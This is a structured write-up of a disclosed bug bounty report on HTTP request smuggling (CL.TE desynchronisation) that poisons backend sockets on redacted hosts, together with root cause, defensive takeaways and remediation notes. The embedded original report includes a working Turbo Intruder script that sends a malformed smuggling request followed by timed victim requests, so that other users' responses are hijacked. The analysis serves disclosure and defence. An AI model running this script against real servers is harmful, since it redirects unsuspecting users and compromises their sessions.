# HTTP Request Smuggling via Backend Socket Poisoning

## Metadata
- **Source:** HackerOne
- **Report:** 526880 | https://hackerone.com/reports/526880
- **Submitted:** 2019-04-04
- **Reporter:** albinowax
- **Program:** Redacted Program (HackerOne Report #526880)
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** HTTP Request Smuggling, CL.TE (Content-Length Transfer-Encoding) Desynchronization, Backend Socket Poisoning
- **CVEs:** None
- **Category:** uncategorised

## Summary
A discrepancy in HTTP header parsing between frontend and backend servers allows attackers to inject malicious requests that get interpreted differently by each layer. The frontend accepts `\n` as a valid header terminator while the backend requires `\r\n`, enabling request smuggling that poisons backend sockets and hijacks responses intended for legitimate users.

## Attack scenario
1. Attacker crafts a malicious POST request containing a header terminated with `\n` instead of `\r\n` (e.g., 'Fooz: bar\nTransfer-Encoding: chunked')
2. Frontend server accepts this request as complete and passes it to the backend
3. Backend server interprets the request differently due to stricter header parsing, treating the smuggled payload as part of the next request
4. Attacker queues victim requests (e.g., GET /foo.jpg) that arrive shortly after the poisoned request
5. Backend processes the smuggled request portion, extracting the injected malicious payload
6. Victim's legitimate response gets hijacked and redirected to an attacker-controlled malicious website

## Root cause
Inconsistent HTTP header parsing between frontend and backend servers regarding header terminators. Frontend accepts `\n` as valid header ending while backend strictly requires `\r\n`, creating a desynchronization window that allows request smuggling. Additionally, inconsistent backend server configurations across load-balanced endpoints exacerbate the vulnerability.

## Attacker mindset
An attacker recognizes that protocol-level ambiguities between layered servers can be exploited for request smuggling. By identifying that different parsing rules exist, they craft requests that appear complete to the frontend but get reinterpreted by the backend, allowing them to inject arbitrary requests into the connection pool. This enables them to hijack other users' responses without requiring authentication or user interaction, making it a high-impact attack vector.

## Defensive takeaways
- Ensure strict HTTP specification compliance across all layers - both frontend and backend must use identical header parsing rules (require `\r\n` terminators)
- Implement request smuggling detection mechanisms that flag requests with ambiguous formatting
- Disable pipelining or implement strict request-response matching to prevent response hijacking
- Maintain consistency across all backend servers in a load-balanced configuration; audit all servers for parsing differences
- Use HTTP/2 or HTTP/3 which have clearer framing semantics and are less vulnerable to smuggling
- Validate and normalize all incoming HTTP requests before forwarding to backend systems
- Implement strict Content-Length and Transfer-Encoding validation, rejecting requests with both headers present
- Monitor for suspicious patterns like requests with non-standard header terminators or mixed chunked/content-length encoding

## Variant hunting
Search for other backend servers with inconsistent HTTP parsing. Look for scenarios where: (1) frontend/CDN accepts header variants backend rejects, (2) different backend servers have different parsing rules, (3) chunked encoding is mishandled, (4) CL.TE or TE.CL desynchronization exists, (5) custom HTTP implementations deviate from RFC specifications

## MITRE ATT&CK
- T1190
- T1557
- T1021
- T1040

## Notes
Report redacts specific domain names and IP addresses. The vulnerability demonstrates the critical importance of protocol consistency in distributed systems. The fact that only some backend servers in the load-balanced pool were vulnerable suggests gradual patching or configuration drift. The attacker's use of Burp Turbo Intruder with timing controls (0.2 second delays) shows sophisticated understanding of race condition exploitation needed to successfully hijack responses.

## Full report
<details><summary>Expand</summary>

**Summary:**


**Description:**
The sites at █████████ and ww.██████████ are vulnerable to backend socket poisoning which enables attackers to hijack responses to other users.

This vulnerability occurs because the backend server regards` \n` as a valid header ending, whereas the backend only thinks `\r\n` is valid. This means it's possible to send requests that are interpreted differently by the two servers, leading to backend socket poisoning.

## Impact
Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required.

## Step-by-step Reproduction Instructions
To replicate this with minimal risk of affecting legitimate users we'll target stage.████████ instead of ██████████, and use the following turbo intruder script:

I've hard-coded the endpoint to ██████████ because it appears that you've got multiple endpoints for stage.█████████ and some are not vulnerable.
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://██████████:443',
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )
    engine.start()    

    attack = '''POST /████ HTTP/1.1
Fooz: bar\nTransfer-Encoding: chunked
Host: stage.█████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Foo: bar

0

GET███████ HTTP/1.1
X: X'''

    engine.queue(attack)

    victim = '''GET /foo.jpg?x=%s HTTP/1.1
Host: stage.████████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive

'''
    for i in range(15):
        engine.queue(victim, i)
        time.sleep(0.2)


def handleResponse(req, interesting):
    table.add(req)

 ```
You should observe that one of the responses to a victim request is a 302 redirect to █████████

## Suggested Mitigation/Remediation Actions
When I resolve stage.███ I get a bunch of IP addresses, and only some of these appear to be vulnerable. As such, you should be able to resolve this issue by making these servers consistent:

```
stage.████████.		59	IN	A	██████████
stage.████.		59	IN	A	████████
stage.█████.		59	IN	A	██████
stage.███████.		59	IN	A	█████
stage.████.		59	IN	A	██████████
stage.██████████.		59	IN	A	█████
```

## Impact

Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required. Socket poisoning also enables a variety of other attacks which I haven't time to explore on your site.

</details>

---
*Analysed by Claude on 2026-05-24*
